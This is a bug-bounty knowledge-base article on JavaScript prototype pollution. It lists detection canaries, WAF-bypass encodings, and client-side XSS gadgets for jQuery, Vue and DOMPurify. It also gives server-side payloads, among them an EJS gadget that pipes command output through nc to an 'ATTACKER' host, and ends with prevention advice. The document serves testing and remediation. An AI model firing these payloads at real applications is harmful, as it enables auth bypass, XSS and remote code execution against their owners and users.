# Prototype Pollution — Client-Side and Server-Side
> Source: PortSwigger Prototype Pollution labs, PAT Prototype Pollution, BlackFan CSPP, PortSwigger SSPP research, yuske/server-side-prototype-pollution
> RAG Knowledge Base | Full detail preserved
> Related: `portswigger-advanced.md`, `bug-chains.md` CHAIN-020, `payloads/prototype-pollution/`

---

## Overview

Prototype pollution is a JavaScript vulnerability where an attacker adds or modifies properties on `Object.prototype` (or other prototypes). Because most objects inherit from `Object.prototype`, polluted properties can affect application logic, security checks, template rendering, and gadget chains leading to XSS or RCE.

**Two contexts:**
- **Client-side (CSPP):** URL query/hash, `JSON.parse` in browser, recursive merge of user objects → DOM XSS via gadgets
- **Server-side (SSPP):** Express/body-parser/qs merge, lodash `merge`, JSON POST bodies → auth bypass, status change, RCE via Node gadgets

**CWE:** CWE-1321 (Improperly Controlled Modification of Object Prototype Attributes), CWE-915

---

## How JavaScript Prototypes Work

```javascript
const config = { isAdmin: false };
// If Object.prototype.isAdmin = true was set earlier:
console.log(config.isAdmin); // true — inherited from prototype
```

Pollution paths:
```javascript
obj.__proto__.polluted = true
obj.constructor.prototype.polluted = true
Object.prototype.polluted = true
```

Merge sinks (common):
```javascript
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') {
      target[key] = target[key] || {};
      merge(target[key], source[key]); // recursive — hits __proto__
    } else {
      target[key] = source[key];
    }
  }
}
```

---

## How to Find Client-Side PP

### Manual methodology
1. Identify URL query/hash parsers (jQuery BBQ, lodash, Vue router, analytics tags)
2. Trace user input into `JSON.parse`, `merge`, `extend`, `defaultsDeep`
3. Use **DOM Invader** (Burp) — auto-detects sources and gadgets
4. After navigation, check DevTools: `Object.prototype` for unexpected keys

### Canary test
```
?__proto__[CANARY_PP_TEST]=1
```
Reload page; in console: `"CANARY_PP_TEST" in Object.prototype` or inspect polluted keys.

### Common entry points
- `?__proto__[key]=value`
- `#__proto__[key]=value`
- `?constructor[prototype][key]=value`
- JSON in WebSocket/postMessage handlers

**Payloads:** `payloads/prototype-pollution/url-query-hash.txt`, `client-side-gadgets.txt`

---

## How to Find Server-Side PP (Black-Box)

PortSwigger SSPP research — detect without DoS:

| Oracle | Payload | Expected signal |
|---|---|---|
| JSON spacing | `{"__proto__":{"json spaces":"  "}}` | Response JSON has extra spaces |
| HTTP status | `{"__proto__":{"status":510}}` | Non-default status code |
| CORS header | `{"__proto__":{"exposedHeaders":["X-Canary"]}}` | `Access-Control-Expose-Headers: X-Canary` |
| Express parameterLimit | `{"__proto__":{"parameterLimit":1}}` + 2 query params | Different handling of second param |
| ignoreQueryPrefix | `{"__proto__":{"ignoreQueryPrefix":true}}` + `??foo=bar` | Param parsed unexpectedly |
| allowDots | `{"__proto__":{"allowDots":true}}` + `?foo.bar=baz` | Nested key accepted |

**Payloads:** `payloads/prototype-pollution/detection-canary.txt`, `server-side-nodejs.txt`

---

## Attack Techniques — JSON Body

```json
{"__proto__":{"isAdmin":true}}
{"__proto__":{"role":"administrator"}}
{"constructor":{"prototype":{"isAdmin":true}}}
{"__proto__":{"shell":"node","argv0":"node","NODE_OPTIONS":"--inspect=attacker.oastify.com"}}
```

Constructor bypass (filters blocking `__proto__` string):
```json
{"constructor":{"prototype":{"polluted":true}}}
```

Unicode / encoding bypass attempts when WAF strips `__proto__`:
```
__proto\u005f\u005f
constructor[prototype]
```

**Payloads:** `payloads/prototype-pollution/json-body-payloads.txt`, `constructor-alternatives.txt`

---

## Attack Techniques — URL Query and Hash

```
?__proto__[admin]=1
?__proto__.test=test
?constructor[prototype][admin]=1
#__proto__[innerHTML]=<img/src/onerror=alert(1)>
?__proto__[transport_url]=data:,alert(1)//
```

Fragment-based ( parsers reading `location.hash`):
```
https://target.com/page#__proto__[key]=value
```

**Payloads:** `payloads/prototype-pollution/url-query-hash.txt`

---

## Client-Side Gadgets (Impact: XSS, sanitizer bypass)

Gadget = application code that reads a property from an object that inherits polluted prototype.

### jQuery
```
?__proto__[url][]=data:,alert(1)//&__proto__[dataType]=script
?__proto__[context]=<img/src/onerror=alert(1)>&__proto__[jquery]=x
```

### Vue.js
```
?__proto__[v-if]=_c.constructor('alert(1)')()
?__proto__[template]=<img/src/onerror=alert(1)>
```

### DOMPurify / sanitize-html bypass (historical)
```
?__proto__[ALLOWED_ATTR][0]=onerror&__proto__[ALLOWED_ATTR][1]=src
?__proto__[*][]=onload
?__proto__[documentMode]=9
```

### Analytics / third-party tags
Google Tag Manager, Tealium, Segment — see BlackFan gadget list.

**Full gadget list:** `payloads/prototype-pollution/client-side-gadgets.txt`
**Reference:** [BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

---

## Server-Side Gadgets (Impact: RCE, auth bypass)

### Express / qs / body-parser oracles
Documented in PAT — pair JSON pollution with GET parameters (see detection table above).

### EJS template engine RCE
```json
{
  "__proto__": {
    "client": 1,
    "escapeFunction": "JSON.stringify; process.mainModule.require('child_process').exec('id | nc ATTACKER 4444')"
  }
}
```

### NODE_OPTIONS / child_process
```json
{"__proto__":{"argv0":"node","shell":"node","NODE_OPTIONS":"--require /proc/self/environ","env":{"EVIL":"require('child_process').execSync('id')"}}}
```

### Kibana CVE-2019-7609 style
```
.es(*).props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

**Payloads:** `payloads/prototype-pollution/rce-gadgets.txt`, `server-side-nodejs.txt`
**Reference:** [yuske/server-side-prototype-pollution](https://github.com/yuske/server-side-prototype-pollution)

---

## Tools

| Tool | Use |
|---|---|
| DOM Invader (Burp) | Client-side source + gadget discovery |
| Burp Scanner | Server-side PP (where licensed) |
| PPScan | Client-side scanner |
| pp-finder | Hunt gadgets in source |
| PortSwigger PP labs | Hands-on CSPP/SSPP |

---

## Testing Workflow (Bug Bounty)

1. **Map merge sinks** — search JS bundles for `merge`, `extend`, `defaultsDeep`, `JSON.parse` on URL params
2. **Client canary** — `?__proto__[canary]=1`, check prototype in console
3. **Server canary** — POST JSON status/spacing/CORS oracles
4. **If polluted** — run gadget payloads from BlackFan + PAT lists
5. **Chain** — PP alone often Info/Low; chain to XSS (CSPP) or RCE (SSPP) for reportability
6. **Document** — exact parameter, pollution key, gadget library/version, impact

See `bug-chains.md` CHAIN-020.

---

## Prevention (for dev reports / remediation sections)

- Use `Object.create(null)` for lookup maps
- Block `__proto__`, `constructor`, `prototype` keys in merge functions
- Use `structuredClone` or safe merge libraries (lodash 4.17.21+ with `__proto__` fixes — still verify)
- Freeze `Object.prototype` where compatible
- Never pass user JSON directly into template options or spawn options

---

## Labs and References

- PortSwigger — Prototype Pollution (client + server labs)
- YesWeHack Dojo — Prototype Pollution
- [PortSwigger SSPP research](https://portswigger.net/research/server-side-prototype-pollution)
- [Securitum — sanitizer bypass via PP](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

---

## Related Files

- `portswigger-advanced.md` — PP summary + OAuth/JWT adjacent topics
- `bug-chains.md` — CHAIN-020 PP → RCE
- `payloads/prototype-pollution/` — all payload lists
- `skills/sharp-edges/references/lang-javascript.md` — PP in code review context
